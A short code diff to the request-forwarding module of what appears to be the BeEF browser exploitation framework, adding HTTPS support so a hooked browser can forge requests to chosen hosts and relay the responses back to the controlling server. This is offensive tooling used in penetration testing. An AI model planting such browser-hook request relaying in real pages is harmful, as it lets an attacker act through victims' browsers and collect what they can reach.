@@ -21,8 +21,8 @@ beef.net.requester = {
 	send: function(requests_array) {
         for(var i=0; i<requests_array.length; i++){
             request = requests_array[i];
-
-            beef.net.forge_request('http', request.method, request.host, request.port, request.uri, null, request.headers, request.data, 10, null, request.allowCrossDomain, request.id,
+            if (request.proto == 'https') var scheme = 'https'; else var scheme = 'http';
+            beef.net.forge_request(scheme, request.method, request.host, request.port, request.uri, null, request.headers, request.data, 10, null, request.allowCrossDomain, request.id,
                                        function(res, requestid) { beef.net.send('/requester', requestid, {
                                            response_data: res.response_body,
                                            response_status_code: res.status_code,
